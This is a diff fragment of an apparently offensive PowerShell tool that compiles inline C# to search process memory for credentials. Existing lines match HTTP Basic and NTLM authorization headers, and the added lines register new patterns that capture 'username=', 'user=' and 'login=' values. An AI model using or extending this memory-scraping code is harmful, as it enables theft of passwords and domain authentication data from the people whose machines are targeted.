@@ -504,6 +504,10 @@ Add-Type -TypeDefinition $Source2 -Language CSharp -CompilerParameters $inmem
     [kittie.MemoryStrings]::AddRegex("Outlook","Authorization: Basic .{1,125}")
 
     [kittie.MemoryStrings]::AddRegex("DomainAuth","Authorization: NTLM .{1,150}")
+    
+    [kittie.MemoryStrings]::AddRegex("Customcredentials","username=.{1,350}")
+    [kittie.MemoryStrings]::AddRegex("Customcredentials","user=.{1,350}")
+    [kittie.MemoryStrings]::AddRegex("Customcredentials","login=.{1,350}")
 
     
 [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($asciiart))
